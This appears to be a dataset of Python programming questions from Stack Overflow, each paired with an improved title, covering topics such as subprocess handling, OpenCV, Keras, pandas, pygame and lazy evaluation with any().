Python : Wait for the first subprocess to finish," I have a list of subprocess' processes. I do not communicate with them and just wait.I want to wait for the first process to finish (this solution works): I don't want use os.wait(), cause it could return from another subprocess not part of the list I'm waiting for.A nice and elegant solution would probably be with an epoll or select and without any loop. <code>  import subprocessa = subprocess.Popen(['...'])b = subprocess.Popen(['...'])# wait for the first process to finishwhile True: over = False for child in {a, b}: try: rst = child.wait(timeout=5) except subprocess.TimeoutExpired: continue # this subprocess is still running if rst is not None: # subprocess is no more running over = True break # If either subprocess exits, so do we. if over: break",Wait for the first subprocess to finish
How does Poetry work regarding numpy & Co.? (poetry / conda for science-heavy projects)," Until now I have been using conda as virtual environment and dependency management. However, some stuff does not work as expected when transfering my environment.yml file from my development machine to the production server. Now, I would like to look into alternatives. Poetry seems nice, especially becausepoetry also maintains a lock file, and it has a benefit over pipenv because it keeps track of which packages are subdependencies. (https://realpython.com/effective-python-environment/#poetry)which might improve stability quite a bit. However, I am working on science-heavy projects (matrices, data science, machine learning), so in practise I need the scipy stack (e.g. numpy, pandas, scitkit-learn).Python became too slow for some pure computational workloads so numpy and scipy were born. [...] They are written in C and just wrapped as a python library.Compiling such libraries brings a set of challenges since they (more or less) have to be compiled on your machine for maximum performance and proper linking with libraries like glibc.Conda was introduced as an all-in-one solution to manage python environments for the scientific community.[...] Instead of using a fragile process of compiling libraries on your machine, libraries are precompiled and just downloaded when you request them. Unfortunately, the solution comes with a caveat - conda does not use PyPI, the most popular index of python packages.(https://modelpredict.com/python-dependency-management-tools#fnref:conda-compiling-challenges)As far as I know, this doesn't even do Conda justice, because it does quite a bit of optimization to get the most out of my CPU/GPU/architecture for numpy. (https://jakevdp.github.io/blog/2016/08/25/conda-myths-and-misconceptions/#Myth-#6:-Now-that-pip-uses-wheels,-conda-is-no-longer-necessary)https://numpy.org/install/ itself advises to use conda, but also says that one can install via pip (and poetry uses pypi)For users who know, from personal preference or reading about the main differences between conda and pip below, they prefer a pip/PyPI-based solution, we recommend:[...] Use Poetry as the most well-maintained tool that provides a dependency resolver and environment management capabilities in a similar fashion as conda does.I would like to get the stability of the poetry setup and the speed of the conda setup.How does poetry handle binary dependencies?Does it also, like conda, consider my hardware?If poetry not deliver in this regard, can I combine it with conda? <code> ",How does Poetry work regarding binary dependencies? (esp. numpy)
how to find infection point in python?," I have a histogram of an image in RGB which represents the three curves of the three components R, G and B. I want to find the inflection points of each curve. I used the second derivative to find them but I can't, the second derivative does not cancel its returns null. So how can I find the inflection point? Is there any other method to find them? <code>  import os, cv2, randomimport numpy as npimport matplotlib.pyplot as pltimport mathfrom sympy import *image = cv2.imread('C:/Users/Xers/Desktop/img.jpg')CHANNELS = ['r', 'g', 'b']for i, channel in enumerate( CHANNELS ): histogram = cv2.calcHist([image], [i], None, [256], [0,256]) histogram = cv2.GaussianBlur( histogram, (5,5), 0) plt.plot(histogram, color = channel) x= plt.xlim([0,256]) y = plt.ylim([0, 24000]) derivative1= np.diff(histogram, axis=0) derivative2= np.diff(derivative1, axis=0) inf_point = np.where ( derivative2 == 0)[0] print(inf_point)plt.show()",How to find inflection point in python?
list assignment using negative indices," If I do this: I get p=[0, 1, 'a', 'b', 6, 7, 8, 9] which means Python is replacing the the elements indexed 2-5 with the new list ['a','b'].Now when, I do Python says ValueError: attempt to assign sequence of size 2 to extended slice of size 4Why does it resize the list in the first case but not the second? <code>  p=list(range(10))p[2:6:1]=['a','b'] p=list(range(10))p[-2:-6:-1]=['a','b']",List slice assignment with resize using negative indices
How do youuse OpenCV's DisparityWLSFilter in Python?," I can compute a depth map with cv2.StereoSGBM that looks pretty good. Now I want to apply WLS filtering as described here.This answer has some info, which I follow below, but I can't quite get to work.How do I use ximgproc_DisparityWLSFilter in Python? I know the theory and how to do it in C++, but can't find any documentation for how the functions were wrapped in Python. (Using OpenCV 4.2.0). This is the source on GitHub, but it doesn't contain the Python bindings either.Doing: Gives: So I know I'm at least able to access the functions.Fixing it like this: Doesn't give any errors, but also doesn't give me an image.Full details:Original images (Tsukuba from the Middlebury data set).My depth map looks like this: <code>  wls = cv2.ximgproc_DisparityWLSFilter.filter(disparity_SGBM, imgL) Traceback (most recent call last): File "".\stereo_SGBM_filtering.py"", line 158, in <module> wls = cv2.ximgproc_DisparityWLSFilter.filter(disparity_SGBM, imgL)TypeError: descriptor 'filter' requires a 'cv2.ximgproc_DisparityFilter' object but received a 'numpy.ndarray' wls = cv2.ximgproc_DisparityWLSFilter(stereoSGBM)filtered_disparity_map = wls.filter(disparity_SGBM, imgL) import cv2 imgL = cv2.imread(""tsukuba_l.png"", cv2.IMREAD_GRAYSCALE) # left image... win_size = 2min_disp = -4max_disp = 9num_disp = max_disp - min_disp # Needs to be divisible by 16stereoSGBM = cv2.StereoSGBM_create( minDisparity=min_disp, numDisparities=num_disp, blockSize=5, uniquenessRatio=5, speckleWindowSize=5, speckleRange=5, disp12MaxDiff=2, P1=8 * 3 * win_size ** 2, P2=32 * 3 * win_size ** 2,)disparity_SGBM = stereoSGBM.compute(imgL_undistorted, imgR_undistorted)wls = cv2.ximgproc_DisparityWLSFilter(stereoSGBM)filtered_disparity_map = wls.filter(disparity_SGBM, imgL)",How do you use OpenCV's DisparityWLSFilter in Python?
how to unpack lists of tuples in python?," I have a list which contains many lists and in those there 4 tuples. I want them in two separate lists like: my attempt was using the map function for this. but this is giving me an error: <code>  my_list = [[(12, 1), (10, 3), (4, 0), (2, 0)], [(110, 1), (34, 2), (12, 1), (55, 3)]] my_list2 = [12,10,4,2,110,34,12,55]my_list3 = [1,3,0,0,1,2,1,3] my_list2 , my_list3 = map(list, zip(*my_list)) ValueError: too many values to unpack (expected 2)",How to make two lists out of two-elements tuples that are stored in a list of lists of tuples
NetworkX - is it possible to change font sizes according to node sizes?," According to NetworkX, node_size can be scalar or array but font_size needs to be integer. How can I change the font size to be bigger if the nodes are big? In fact, is it possible to change font sizes according to node sizes? <code>  draw_networkx(G, pos=None, arrows=True, with_labels=True, **kwds), ",Is it possible to change font sizes according to node sizes?
"On AWS elatic search {""Message"":""User: anonymous is not authorized to perform: es:ESHttpGet""}"," I have created AWS elasticsearch domainhttps://search-xx-xx.us-east-1.es.amazonaws.com/On click both elastic url and kibana below is the error i got{""Message"":""User: anonymous is not authorized to perform: es:ESHttpGet""}Below is code which is working fine Below is the access policy <code>  import boto3from requests_aws4auth import AWS4Authfrom elasticsearch import Elasticsearch, RequestsHttpConnectionsession = boto3.session.Session()credentials = session.get_credentials()awsauth = AWS4Auth(credentials.access_key, credentials.secret_key, session.region_name, 'es', session_token=credentials.token)es = Elasticsearch( ['https://search-testelastic-2276kyz2u4l3basec63onfq73a.us-east-1.es.amazonaws.com'], http_auth=awsauth, use_ssl=True, verify_certs=True, connection_class=RequestsHttpConnection)def lambda_handler(event, context): es.cluster.health() es.indices.create(index='my-index', ignore=400) r = [{'Name': 'Dr. Christopher DeSimone', 'Specialised and Location': 'Health'}, {'Name': 'Dr. Tajwar Aamir (Aamir)', 'Specialised and Location': 'Health'}, {'Name': 'Dr. Bernard M. Aaron', 'Specialised and Location': 'Health'}, {'Name': 'Eliana M. Aaron', 'Specialised and Location': 'Health'}, {'Name': 'Dr. Joseph J. Aaron', 'Specialised and Location': 'Health'}, {'Name': 'Dr. Michael R. Aaron', 'Specialised and Location': 'Health'}, {'Name': 'Dr. Darryl H. Aarons', 'Specialised and Location': 'Health'}, {'Name': 'Dr. William B. Aarons', 'Specialised and Location': 'Health'}, {'Name': 'Dr. Sirike T. Aasmaa', 'Specialised and Location': 'Health'}, {'Name': 'Dr. Jacobo A. Abadi', 'Specialised and Location': 'Health'}] for e in enumerate(r): es.index(index=""my-index"", body=e[1]) { ""Version"": ""2012-10-17"", ""Statement"": [ { ""Effect"": ""Allow"", ""Principal"": { ""AWS"": ""*"" }, ""Action"": ""es:*"", ""Resource"": ""arn:aws:es:us-east-1:xxxxxx:domain/xxxxx/*"", ""Condition"": { ""IpAddress"": { ""aws:SourceIp"": ""*"" } } } ]}","On AWS elastic search {""Message"":""User: anonymous is not authorized to perform: es:ESHttpGet""}"
'tuple' object has no attribute 'rank' when fit keras model with custom generator," I want to build a Neural Network with two inputs: for image data and for numeric data. So I wrote custom data generator for that. The train and validation dataframes contain 11 columns:image_name path to the image;9 numeric features;target class for the item (last column).The code for custom generator (based on this answer): Model building: And fitting doesn't work with error message: So I tried to look at Keras sources but without any success.If I use modified train_generator and validation_generator (y_col='target' instead of y_col=train.columns[1:]) everything works fine. <code>  target_size = (224, 224)batch_size = 1train_datagen = ImageDataGenerator( rescale=1./255, rotation_range=20, width_shift_range=0.2, height_shift_range=0.2, horizontal_flip=True)val_datagen = ImageDataGenerator(rescale=1./255)train_generator = train_datagen.flow_from_dataframe( train, x_col='image_name', y_col=train.columns[1:], target_size=target_size, batch_size=batch_size, shuffle=True, class_mode='raw')validation_generator = val_datagen.flow_from_dataframe( validation, x_col='image_name', y_col=validation.columns[1:], target_size=target_size, shuffle=False, batch_size=batch_size, class_mode='raw')def train_generator_func(): count = 0 while True: if count == len(train.index): train_generator.reset() break count += 1 data = train_generator.next() imgs = [] cols = [] targets = [] for k in range(batch_size): imgs.append(data[0][k]) cols.append(data[1][k][:-1]) targets.append(data[1][k][-1]) yield [imgs, cols], targets def validation_generator_func(): count = 0 while True: if count == len(validation.index): validation_generator.reset() break count += 1 data = validation_generator.next() imgs = [] cols = [] targets = [] for k in range(batch_size): imgs.append(data[0][k]) cols.append(data[1][k][:-1]) targets.append(data[1][k][-1]) yield [imgs, cols], targets def mlp_model(dim): model = Sequential() model.add(Dense(8, input_dim=dim, activation=""relu"")) model.add(Dense(4, activation=""relu"")) return modeldef vgg16_model(): model = VGG16(weights='imagenet', include_top=False, input_shape=target_size+(3,)) x=Flatten()(model.output) output=Dense(1,activation='sigmoid')(x) # because we have to predict the AUC model=Model(model.input,output) return modeldef concatenated_model(cnn, mlp): combinedInput = concatenate([cnn.output, mlp.output]) x = Dense(4, activation=""relu"")(combinedInput) x = Dense(1, activation=""sigmoid"")(x) model = Model(inputs=[cnn.input, mlp.input], outputs=x) return modeldef focal_loss(alpha=0.25,gamma=2.0): def focal_crossentropy(y_true, y_pred): bce = K.binary_crossentropy(y_true, y_pred) y_pred = K.clip(y_pred, K.epsilon(), 1.- K.epsilon()) p_t = (y_true*y_pred) + ((1-y_true)*(1-y_pred)) alpha_factor = 1 modulating_factor = 1 alpha_factor = y_true*alpha + ((1-alpha)*(1-y_true)) modulating_factor = K.pow((1-p_t), gamma) # compute the final loss and return return K.mean(alpha_factor*modulating_factor*bce, axis=-1) return focal_crossentropycnn = vgg16_model()mlp = mlp_model(9)model = concatenated_model(cnn, mlp)opt = Adam(lr=1e-5)model.compile(loss=focal_loss(), metrics=[tf.keras.metrics.AUC()],optimizer=opt)nb_epochs = 2nb_train_steps = train.shape[0]//batch_sizenb_val_steps = validation.shape[0]//batch_sizemodel.fit( train_generator_func(), steps_per_epoch=nb_train_steps, epochs=nb_epochs, validation_data=validation_generator_func(), validation_steps=nb_val_steps) AttributeError Traceback (most recent call last)<ipython-input-53-253849fd34d6> in <module> 9 epochs=nb_epochs, 10 validation_data=validation_generator_func(),---> 11 validation_steps=nb_val_steps)d:\pyenv\keras-gpu\lib\site-packages\tensorflow\python\keras\engine\training.py in _method_wrapper(self, *args, **kwargs) 106 def _method_wrapper(self, *args, **kwargs): 107 if not self._in_multi_worker_mode(): # pylint: disable=protected-access--> 108 return method(self, *args, **kwargs) 109 110 # Running inside `run_distribute_coordinator` already.d:\pyenv\keras-gpu\lib\site-packages\tensorflow\python\keras\engine\training.py in fit(self, x, y, batch_size, epochs, verbose, callbacks, validation_split, validation_data, shuffle, class_weight, sample_weight, initial_epoch, steps_per_epoch, validation_steps, validation_batch_size, validation_freq, max_queue_size, workers, use_multiprocessing) 1061 use_multiprocessing=use_multiprocessing, 1062 model=self,-> 1063 steps_per_execution=self._steps_per_execution) 1064 1065 # Container that configures and calls `tf.keras.Callback`s.d:\pyenv\keras-gpu\lib\site-packages\tensorflow\python\keras\engine\data_adapter.py in __init__(self, x, y, sample_weight, batch_size, steps_per_epoch, initial_epoch, epochs, shuffle, class_weight, max_queue_size, workers, use_multiprocessing, model, steps_per_execution) 1108 use_multiprocessing=use_multiprocessing, 1109 distribution_strategy=ds_context.get_strategy(),-> 1110 model=model) 1111 1112 strategy = ds_context.get_strategy()d:\pyenv\keras-gpu\lib\site-packages\tensorflow\python\keras\engine\data_adapter.py in __init__(self, x, y, sample_weights, workers, use_multiprocessing, max_queue_size, model, **kwargs) 796 return tensor_shape.TensorShape([None for _ in shape.as_list()]) 797 --> 798 output_shapes = nest.map_structure(_get_dynamic_shape, peek) 799 output_types = nest.map_structure(lambda t: t.dtype, peek) 800 d:\pyenv\keras-gpu\lib\site-packages\tensorflow\python\util\nest.py in map_structure(func, *structure, **kwargs) 633 634 return pack_sequence_as(--> 635 structure[0], [func(*x) for x in entries], 636 expand_composites=expand_composites) 637 d:\pyenv\keras-gpu\lib\site-packages\tensorflow\python\util\nest.py in <listcomp>(.0) 633 634 return pack_sequence_as(--> 635 structure[0], [func(*x) for x in entries], 636 expand_composites=expand_composites) 637 d:\pyenv\keras-gpu\lib\site-packages\tensorflow\python\keras\engine\data_adapter.py in _get_dynamic_shape(t) 792 shape = t.shape 793 # Unknown number of dimensions, `as_list` cannot be called.--> 794 if shape.rank is None: 795 return shape 796 return tensor_shape.TensorShape([None for _ in shape.as_list()])AttributeError: 'tuple' object has no attribute 'rank'",AttributeError: 'tuple' object has no attribute 'rank' when calling fit on a Keras model with custom generator
What method does Python call at the bottom when I access the properties of a class directly by the class name?," I know accessing the attributes of Foo through an instance will call the __getattribute__() method, but what if I access this attribute directly through the class? If a function is called, I want to set a breakpoint in it so that the breakpoint can be triggered when accessing this property through a class in my project.I have tried to set breakpoint in magic method __getattribute__(), but nothing hapened. <code>  class Foo: age = 18print(Foo.age) # I am curious what method is called",What method does Python call when I access an attribute of a class via the class name?
How to scrape all topics from twiiter," All topics in twitter can be found in this linkI would like to scrape all of them with each of the subcategory inside.BeautifulSoup doesn't seem to be useful here. I tried using selenium, but I don't know how to match the Xpaths that come after clicking the main category. I know I can click the main category using main_topics[3].click(), but I don't know how I can maybe recursively click through them until I find only the ones with Follow on the right. <code>  from selenium import webdriverfrom selenium.common import exceptionsurl = 'https://twitter.com/i/flow/topics_selector'driver = webdriver.Chrome('absolute path to chromedriver')driver.get(url)driver.maximize_window()main_topics = driver.find_elements_by_xpath('/html/body/div[1]/div/div/div[1]/div[2]/div/div/div/div/div/div[2]/div[2]/div/div/div[2]/div[2]/div/div/div/div/span')topics = {}for main_topic in main_topics[2:]: print(main_topic.text.strip()) topics[main_topic.text.strip()] = {}",How to scrape all topics from twitter
Calculate min and max value of a transition with index of first occurance in pandas," I have a DataFrame: I want to calculate how many times a transition has occurred. Here in the ID column a->b is considered as a transition, similarly for b->d, d->d, d->a, b->c, c->b, b->a. I can do this using Counter like: I also need to get min and max of the sec column of those transitions. Here for example a->b has occurred 3 times out of them min sec value is 1 and max sec value is 7. Also I want to get where this transition first occurred for a->b its 0. For the transition_index column I consider the first value of a transition, i.e. index of a and for calculating, min, max I take the second value of the transition, i.e. value at b.Here is the final output I want to get: How can I achieve this in Python?Also I have a huge amount of data, so I'm looking for the fastest way possible. <code>  df = pd.DataFrame({'ID':['a','b','d','d','a','b','c','b','d','a','b','a'], 'sec':[3,6,2,0,4,7,10,19,40,3,1,2]})print(df) ID sec0 a 31 b 62 d 23 d 04 a 45 b 76 c 107 b 198 d 409 a 310 b 111 a 2 Counter(zip(df['ID'].to_list(),df['ID'].to_list()[1:]))Counter({('a', 'b'): 3, ('b', 'd'): 2, ('d', 'd'): 1, ('d', 'a'): 2, ('b', 'c'): 1, ('c', 'b'): 1, ('b', 'a'): 1}) df = pd.DataFrame({'ID_1':['a','b','d','d','b','c','b'], 'ID_2':['b','d','d','a','c','b','a'], 'sec_min':[1,2,0,3,10,19,2], 'sec_max':[7,40,0,4,10,19,2], 'transition_index':[0,1,2,3,5,6,10], 'count':[3,2,1,2,1,1,1]})print(df) ID_1 ID_2 sec_min sec_max transition_index count0 a b 1 7 0 31 b d 2 40 1 22 d d 0 0 2 13 d a 3 4 3 24 b c 10 10 5 15 c b 19 19 6 16 b a 2 2 10 1",Calculate min and max value of a transition with index of first occurrence in pandas
Python in operator confuse," I found strange behavior with Python's in operator I thought it's because of precedence: But, what precedence evaluates the following expression then? If it's because of wrong precedence why it doesn't fire an error like if: In other words, what happens under the hood of Python with this expression? <code>  d = {}'k' in d == False # False! ('k' in d) == False # True, it's okay'k' in (d == False) # Error, it's also okay d = {}'k' in d == False 'k' in (d == False) 'k' in d == False",Confusion related to Python's `in` operator
Is there a better way to make a multi line while statement (more than 10 conditions) in Python?," In this exercise I need to come up with a way to find the least common multiple (LCM) for the first 20 natural numbers (1-20).So far this is what I got: Is there a more efficient, to code this without the need to write a condition for every potential number to be factored in the loop? <code>  if exercise == 34: lcm = 20 while lcm % 2 != 0 or \ lcm % 3 != 0 or \ lcm % 4 != 0 or \ lcm % 5 != 0 or \ lcm % 6 != 0 or \ lcm % 7 != 0 or \ lcm % 8 != 0 or \ lcm % 9 != 0 or \ lcm % 10 != 0 or \ lcm % 11 != 0 or \ lcm % 12 != 0 or \ lcm % 13 != 0 or \ lcm % 14 != 0 or \ lcm % 15 != 0 or \ lcm % 16 != 0 or \ lcm % 17 != 0 or \ lcm % 18 != 0 or \ lcm % 19 != 0 or \ lcm % 20 != 0: lcm += 1 print(lcm)",How can I reduce the number of conditions in a statement?
How can I improve my LCM code with lots of OR conditions in a while loop?," In this exercise I need to come up with a way to find the least common multiple (LCM) for the first 20 natural numbers (1-20).So far this is what I got: Is there a more efficient, to code this without the need to write a condition for every potential number to be factored in the loop? <code>  if exercise == 34: lcm = 20 while lcm % 2 != 0 or \ lcm % 3 != 0 or \ lcm % 4 != 0 or \ lcm % 5 != 0 or \ lcm % 6 != 0 or \ lcm % 7 != 0 or \ lcm % 8 != 0 or \ lcm % 9 != 0 or \ lcm % 10 != 0 or \ lcm % 11 != 0 or \ lcm % 12 != 0 or \ lcm % 13 != 0 or \ lcm % 14 != 0 or \ lcm % 15 != 0 or \ lcm % 16 != 0 or \ lcm % 17 != 0 or \ lcm % 18 != 0 or \ lcm % 19 != 0 or \ lcm % 20 != 0: lcm += 1 print(lcm)",How can I reduce the number of conditions in a statement?
what is the recommended way to access data from R data.table in python? Can i avoid writing data to disc?," Is there some recommended way to pass data from R (in the form of data.table) to Python without having to save the data to disc? I know I could use python modules from R using reticulate (and I suppose the same thing can be done on the other side using rpy2), but from what I've read that hurts the overall performance of the libraries and therefore there is quite a big chance that it's better to store to disc my r data.table and read that same data from disc using python and running, say, lightgbm, than to try to run lightgbm using reticulate or data.table using rpy2.Why don't I just stick to either R or Python:I prefer using r data.table (as opposed to Pandas) for my data manipulations, because it is way faster, more memory efficient, and has a lot of features which I like, such as inequi joins, rolling joins, cartesian joins, and pretty straightforward melting and casting. I also like that whenever I ask a data.table related question in stack overflow, I get a high-quality answer pretty fast, while for Pandas i haven't been so successful. However, there are tasks for which I prefer python, such as when it comes to gradient boosting or neural networks. <code> ",What is the recommended way to access data from R data.table in python? Can I avoid writing data to disc?
What is !r called in python," I am seeing this for the first time. I wanted to know what the !r in the last line of the code called so that I can search about it. I found this piece of code on: https://adamj.eu/tech/2020/08/10/a-guide-to-python-lambda-functions/ <code>  class Puppy: def __init__(self, name, cuteness): self.name = name self.cuteness = cuteness def __repr__(self): return f""Puppy({self.name!r}, {self.cuteness!r})""",What is !r called?
How to detect collision between two images in pygame," I am making a game in which the player has to use a bowl to catch falling items. I have some images of items in a list and an image of a bowl that is used to catch the items. The items keep on falling and reset to the top of the screen if they reach the boundary (bottom edge). I got this logic done which allows the items to fall but I do not know how to detect when there is a collision between the bowl and item.My code: <code>  import mathimport pygameimport randompygame.init()display_width = 800display_height = 600game_display = pygame.display.set_mode((display_width, display_height))clock = pygame.time.Clock()pygame.display.set_caption(""Catch the Ball"")white = (255, 255, 255)black = (0, 0, 0)red = (255, 0, 0)blue = (0, 255, 0)player_img = pygame.image.load(""Images/soup.png"")thing_imgs = [pygame.image.load('Images/muffin.png'), pygame.image.load('Images/dessert.png'), pygame.image.load('Images/cheese.png'), pygame.image.load('Images/fruit.png')]def player(x, y): game_display.blit(player_img, (x, y))def things(x, y, img): game_display.blit(img, (x, y))def game_loop(): running = True x = display_width * 0.45 y = display_height * 0.8 x_change = 0 player_width = 64 player_height = 64 things_cor = [[random.randint(0, display_width), 32]] things_added = [random.choice(thing_imgs)] thing_height = 32 thing_width = 32 y_change = 5 caught = 0 while running: for event in pygame.event.get(): if event.type == pygame.QUIT: running = False if event.type == pygame.KEYDOWN: if event.key == pygame.K_LEFT: x_change = -5 if event.key == pygame.K_RIGHT: x_change = 5 if event.type == pygame.KEYUP: if event.key == pygame.K_LEFT or event.key == pygame.K_RIGHT: x_change = 0 game_display.fill(white) player(x, y) x += x_change for i in range(len(things_cor)): thing_x, thing_y = things_cor[i] things(thing_x, thing_y, things_added[i]) for i in range(len(things_cor)): things_cor[i][1] += y_change if things_cor[i][1] > display_height: things_cor[i][1] = random.randint(-2000, -1000) things_cor[i][0] = random.randint(0, display_width) things_added[i] = random.choice(thing_imgs) things_added.append(random.choice(thing_imgs)) if len(things_added) < 6: things_cor.append( [random.randint(0, display_width), -10]) if x < 0: x = 0 elif x > display_width - player_width: x = display_width - player_width clock.tick(60) pygame.display.update()game_loop()",How to detect collisions between two rectangular objects or images in pygame
How to detect collisions between two rectangular objects or images in the pygame," I am making a game in which the player has to use a bowl to catch falling items. I have some images of items in a list and an image of a bowl that is used to catch the items. The items keep on falling and reset to the top of the screen if they reach the boundary (bottom edge). I got this logic done which allows the items to fall but I do not know how to detect when there is a collision between the bowl and item.My code: <code>  import mathimport pygameimport randompygame.init()display_width = 800display_height = 600game_display = pygame.display.set_mode((display_width, display_height))clock = pygame.time.Clock()pygame.display.set_caption(""Catch the Ball"")white = (255, 255, 255)black = (0, 0, 0)red = (255, 0, 0)blue = (0, 255, 0)player_img = pygame.image.load(""Images/soup.png"")thing_imgs = [pygame.image.load('Images/muffin.png'), pygame.image.load('Images/dessert.png'), pygame.image.load('Images/cheese.png'), pygame.image.load('Images/fruit.png')]def player(x, y): game_display.blit(player_img, (x, y))def things(x, y, img): game_display.blit(img, (x, y))def game_loop(): running = True x = display_width * 0.45 y = display_height * 0.8 x_change = 0 player_width = 64 player_height = 64 things_cor = [[random.randint(0, display_width), 32]] things_added = [random.choice(thing_imgs)] thing_height = 32 thing_width = 32 y_change = 5 caught = 0 while running: for event in pygame.event.get(): if event.type == pygame.QUIT: running = False if event.type == pygame.KEYDOWN: if event.key == pygame.K_LEFT: x_change = -5 if event.key == pygame.K_RIGHT: x_change = 5 if event.type == pygame.KEYUP: if event.key == pygame.K_LEFT or event.key == pygame.K_RIGHT: x_change = 0 game_display.fill(white) player(x, y) x += x_change for i in range(len(things_cor)): thing_x, thing_y = things_cor[i] things(thing_x, thing_y, things_added[i]) for i in range(len(things_cor)): things_cor[i][1] += y_change if things_cor[i][1] > display_height: things_cor[i][1] = random.randint(-2000, -1000) things_cor[i][0] = random.randint(0, display_width) things_added[i] = random.choice(thing_imgs) things_added.append(random.choice(thing_imgs)) if len(things_added) < 6: things_cor.append( [random.randint(0, display_width), -10]) if x < 0: x = 0 elif x > display_width - player_width: x = display_width - player_width clock.tick(60) pygame.display.update()game_loop()",How to detect collisions between two rectangular objects or images in pygame
Why is bounding a class instance method different from bounding a class method?," I was reading the python docs and stumbled upon the following lines:It is also important to note that user-defined functions which are attributes of a class instance are not converted to bound methods; this only happens when the function is an attribute of the class.Please, someone explain what does that mean in plain english.I'm going to introduce some shorthand notation:let 'user-defined functions' be denoted by f,let 'class instance' be denoted by ci while class denoted simply by c. Obviously(?), ci = c(), with some abuse of notation.Also, allow membership statements to be recast in simple set notation eg 'user-defined functions which are attributes of a class instance' in shorthand is 'vf: fa(ci)', where v: 'for all' and where 'a' is the shorthand for (set of) attributes (eg of a class or class instance) and '' denotes the set membership function.Also, the process of binding a function is described in shorthand by ci.f(*args) or c.f(*args) => f(ci, *args) or f(c, *args) (the former referring to an instance method call while the later referring to a class method call)Using the newly introduced shorthand notation, does the quote from the docs imply thatvf: fa(c), c.f(*args) => f(c, *args) is a true statementwhilevf: fa(ci), ci.f(*args) => f(ci, *args) is false? <code> ",Why is binding a class instance method different from binding a class method?
How to install python 3.6.12 on Windows?," Take python 3.6.x for example. The last windows installer for python 3.6.x is 3.6.8: no more installers for 3.6x version that comes later (see https://www.python.org/downloads/windows/)3.6.8 happens to be the last maintenance release of python3.6, I don't know if it is somehow related to not propose a package installer for windows but only sources.Practical problem here: How should I proceed to install 3.6.12 on Windows?Please dont simply advice Install 3.7 or 3.8, it is more recent. I know that 3.6 is not the latest, but sometimes you have to stick with a particular version for support or compatibility.Since I have to use 3.6.x, I am looking for the latest version available in this branch (currently 3.6.12) to still benefit from security patches.This gives two path:install 3.6.8 with MSI installer then upgrade to 3.6.12 from source,install 3.6.12 from source.What are the steps involved for option 1 or 2? <code> ",How to install python on Windows without an MSI installer?
Check if shape is decorative using python-pptx," The company I work at requires a list of all inaccessible images/shapes in a .pptx document (don't have alt-text and aren't decorative). To automate the process, I'm writing a script that extracts all inaccessible images/shapes in a specified .pptx and compiles a list. So far, I've managed to make it print out the name, slide #, and image blob of images with no alt-text.Unfortunately after extensively searching the docs, I came to find that the python-pptx package does not support functionality for checking whether an image/shape is decorative or not.I haven't mapped XML elements to objects in the past and was wondering how I could go about making a function that reads the val attribute within the adec:decorative element in this .pptx file (see line 4). Since I've only recently started using this package, I'm not sure how to go about creating custom element classes within python-pptx. If anyone has any other workaround or suggestions please let me know, thank you! <code>  <p:cNvPr id=""3"" name=""Picture 2""> <a:extLst> <a:ext uri=""{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}""><a16:creationId xmlns:a16=""http://schemas.microsoft.com/office/drawing/2014/main"" id=""{77922398-FA3E-426B-895D-97239096AD1F}"" /></a:ext> <a:ext uri=""{C183D7F6-B498-43B3-948B-1728B52AA6E4}""><adec:decorative xmlns:adec=""http://schemas.microsoft.com/office/drawing/2017/decorative"" val=""0"" /></a:ext> </a:extLst></p:cNvPr>",Check if image is decorative in powerpoint using python-pptx
What is the mean in python with $()s?," I see like this %(asctime)s in the logging moduleWhat is the meaning of %()s instead of %s?I only know %s means ""string"" and I can't find other information about %()s on the internet. <code> ",What is the meaning of %()s in Python?
What is the meaning of $()s in Python?," I see like this %(asctime)s in the logging moduleWhat is the meaning of %()s instead of %s?I only know %s means ""string"" and I can't find other information about %()s on the internet. <code> ",What is the meaning of %()s in Python?
Plotly: How to show both a normal plot and a kernel density estimation in a distribution plot?," For a plotly figure factory distribution plot, the default distribution is kde (kernel density estimation):You can override the default by setting curve = 'normal' to get:But how can you show both kde and the normal curve in the same plot? Assigning a list like curve_type = ['kde', 'normal'] will not work.Complete code: <code>  import plotly.figure_factory as ffimport plotly.graph_objects as goimport plotly.express as pximport numpy as npnp.random.seed(2)x = np.random.randn(1000)hist_data = [x]group_labels = ['distplot'] # name of the datasetmean = np.mean(x)stdev_pluss = np.std(x)stdev_minus = np.std(x)*-1fig = ff.create_distplot(hist_data, group_labels, curve_type='kde')fig.update_layout(template = 'plotly_dark')fig.show()",Plotly: How to show both a normal distribution and a kernel density estimation in a histogram?
Python: lazy function evaluation in any() / all()," Logical operators in Python are lazy. With the following definition: calling the or operator only evaluates the first function call, because or recognizes that the expression evaluates toTrue, irregardless of the return value of the second function call. and does behave analogously.However, when using any() (analogously: all()) in the following way: all function calls are evaluated, because the inner list is constructed first, before any starts to iterate over the boolean values of its items. The same happens when we omit the list construction and just write That way we lose the power of any being short-circuit, which means that it breaks as soon as the first element of the iterable is truish. If the function calls are expensive, evaluating all the functions up front is a big loss and is a waste of this ability of any. In some sense, one could call this a Python gotcha, because it might be unexpected for users trying to leverage this feature of any, and because any is often thought as being just another syntactic way of chaining a sequence of or statements. But any is just short-circuit, not lazy, and that is a difference here.any is accepting an iterable. So, there should be a way of creating an iterator which does not evaluate its elements up front but pass them unevaluated to any and lets them evaluate inside of any only, in order to achieve a fully lazy evaluation.So, the question is: How can we use any with truly lazy function evaluation? That means: How can we make an iterator of function calls which any can consume, without evaluating all the function calls in advance? <code>  def func(s): print(s) return True >>> func('s') or func('t')'s' >>> any([func('s'), func('t')])'s''t' >>> any(func('s'), func('t'))'s''t'",Python: Lazy Function Evaluation in any() / all()
Lazy function evaluation in any() / all()," Logical operators in Python are lazy. With the following definition: calling the or operator only evaluates the first function call, because or recognizes that the expression evaluates toTrue, irregardless of the return value of the second function call. and does behave analogously.However, when using any() (analogously: all()) in the following way: all function calls are evaluated, because the inner list is constructed first, before any starts to iterate over the boolean values of its items. The same happens when we omit the list construction and just write That way we lose the power of any being short-circuit, which means that it breaks as soon as the first element of the iterable is truish. If the function calls are expensive, evaluating all the functions up front is a big loss and is a waste of this ability of any. In some sense, one could call this a Python gotcha, because it might be unexpected for users trying to leverage this feature of any, and because any is often thought as being just another syntactic way of chaining a sequence of or statements. But any is just short-circuit, not lazy, and that is a difference here.any is accepting an iterable. So, there should be a way of creating an iterator which does not evaluate its elements up front but pass them unevaluated to any and lets them evaluate inside of any only, in order to achieve a fully lazy evaluation.So, the question is: How can we use any with truly lazy function evaluation? That means: How can we make an iterator of function calls which any can consume, without evaluating all the function calls in advance? <code>  def func(s): print(s) return True >>> func('s') or func('t')'s' >>> any([func('s'), func('t')])'s''t' >>> any(func('s'), func('t'))'s''t'",Python: Lazy Function Evaluation in any() / all()
